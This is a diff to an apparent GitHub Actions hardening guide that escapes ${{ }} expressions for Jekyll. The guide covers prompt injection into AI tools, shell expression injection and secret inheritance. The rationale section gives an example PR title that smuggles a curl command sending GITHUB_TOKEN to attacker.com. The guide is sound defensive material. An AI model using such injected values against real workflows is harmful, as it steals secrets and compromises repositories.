@@ -1866,7 +1866,7 @@ Prevent prompt injection attacks where untrusted input (issue titles, PR descrip
 3. Map the permissions each AI tool has access to
 
 **Step 2: Sanitize Inputs Before AI Processing**
-1. Never pass raw `${{ github.event.issue.title }}`, `${{ github.event.pull_request.body }}`, or `${{ github.event.comment.body }}` directly to AI tools
+1. Never pass raw `{% raw %}${{ github.event.issue.title }}{% endraw %}`, `{% raw %}${{ github.event.pull_request.body }}{% endraw %}`, or `{% raw %}${{ github.event.comment.body }}{% endraw %}` directly to AI tools
 2. Use intermediate environment variables with explicit sanitization
 3. Strip or escape instruction-like patterns from user input before AI processing
 4. Limit the length of user input passed to AI tools
@@ -1913,14 +1913,14 @@ Prevent prompt injection attacks where untrusted input (issue titles, PR descrip
 **CIS Controls:** 16.12
 
 #### Description
-Prevent shell command injection attacks caused by GitHub Actions expression syntax (`${{ }}`) interpolating user-controlled values directly into `run:` script blocks. This is the same class of vulnerability as SQL injection or PHP template injection — user input is concatenated into executable code without escaping. Attackers craft malicious PR titles, branch names, issue bodies, or commit messages containing shell metacharacters that execute when the workflow runs.
+Prevent shell command injection attacks caused by GitHub Actions expression syntax (`{% raw %}${{ }}{% endraw %}`) interpolating user-controlled values directly into `run:` script blocks. This is the same class of vulnerability as SQL injection or PHP template injection — user input is concatenated into executable code without escaping. Attackers craft malicious PR titles, branch names, issue bodies, or commit messages containing shell metacharacters that execute when the workflow runs.
 
 #### Rationale
-**Attack Vector:** GitHub Actions processes `${{ }}` expressions via string interpolation BEFORE the shell parses the command. A PR title like `"; curl attacker.com/exfil?t=$GITHUB_TOKEN #` becomes part of the shell command, executing arbitrary code with the workflow's permissions and secret access.
+**Attack Vector:** GitHub Actions processes `{% raw %}${{ }}{% endraw %}` expressions via string interpolation BEFORE the shell parses the command. A PR title like `"; curl attacker.com/exfil?t=$GITHUB_TOKEN #` becomes part of the shell command, executing arbitrary code with the workflow's permissions and secret access.
 
 **Why This Matters:**
-- This is the most common GitHub Actions vulnerability class — it affects any workflow that uses `${{ github.event.* }}` expressions in `run:` blocks
-- The `${{ }}` syntax performs raw string replacement with no escaping — the same fundamental mistake as PHP's `mysql_query("SELECT * FROM users WHERE name='$_GET[name]'")`
+- This is the most common GitHub Actions vulnerability class — it affects any workflow that uses `{% raw %}${{ github.event.* }}{% endraw %}` expressions in `run:` blocks
+- The `{% raw %}${{ }}{% endraw %}` syntax performs raw string replacement with no escaping — the same fundamental mistake as PHP's `mysql_query("SELECT * FROM users WHERE name='$_GET[name]'")`
 - Unlike `pull_request_target` (which requires a fork), expression injection works on any workflow trigger that processes user-controlled context: `issues`, `issue_comment`, `pull_request`, `push` (via branch names), and more
 - Static analysis tools (`zizmor`, `actionlint`) can automatically detect these patterns
 
@@ -1942,12 +1942,12 @@ Prevent shell command injection attacks caused by GitHub Actions expression synt
 
 **Step 1: Audit Workflows for Unsafe Expressions**
 1. Run `zizmor .github/workflows/` to scan for expression injection (install: `cargo install zizmor` or `brew install zizmor`)
-2. Or run the HTH audit script (see Code Pack) which checks all dangerous `${{ github.event.* }}` patterns in `run:` blocks
+2. Or run the HTH audit script (see Code Pack) which checks all dangerous `{% raw %}${{ github.event.* }}{% endraw %}` patterns in `run:` blocks
 3. Also run `actionlint .github/workflows/*.yml` for structural validation
-4. Any `${{ github.event.*.title }}`, `${{ github.event.*.body }}`, or `${{ github.head_ref }}` inside a `run:` block is a finding
+4. Any `{% raw %}${{ github.event.*.title }}{% endraw %}`, `{% raw %}${{ github.event.*.body }}{% endraw %}`, or `{% raw %}${{ github.head_ref }}{% endraw %}` inside a `run:` block is a finding
 
 **Step 2: Remediate by Using Environment Variables**
-1. Move every dangerous `${{ }}` expression from `run:` blocks to `env:` blocks
+1. Move every dangerous `{% raw %}${{ }}{% endraw %}` expression from `run:` blocks to `env:` blocks
 2. Reference the value via `$ENV_VAR` in the shell command
 3. When the value is in an environment variable, the shell treats it as data, not code — the same principle as parameterized SQL queries
 
@@ -1969,7 +1969,7 @@ Prevent shell command injection attacks caused by GitHub Actions expression synt
 
 #### Validation & Testing
 1. Run `zizmor .github/workflows/` — zero expression injection findings
-2. No `${{ github.event.*.body }}` or `${{ github.event.*.title }}` appears inside any `run:` block
+2. No `{% raw %}${{ github.event.*.body }}{% endraw %}` or `{% raw %}${{ github.event.*.title }}{% endraw %}` appears inside any `run:` block
 3. All user-controlled values are accessed via `env:` blocks in workflows
 4. `zizmor` CI action runs on every PR that modifies workflow files
 5. Run the HTH audit script — exit code 0
@@ -2534,7 +2534,7 @@ Prohibit the use of `secrets: inherit` when calling reusable workflows. Instead,
 **Step 2: Audit for `toJSON(secrets)` Usage**
 1. Search all workflow files for `toJSON(secrets)` or `toJson(secrets)`
 2. Remove or replace with references to specific secrets
-3. Check for indirect exposure through composite actions that may use `${{ toJSON(github) }}` alongside secrets context
+3. Check for indirect exposure through composite actions that may use `{% raw %}${{ toJSON(github) }}{% endraw %}` alongside secrets context
 
 **Step 3: Enforce via Code Review**
 1. Add a CI check or CODEOWNERS rule requiring security team review for workflow file changes
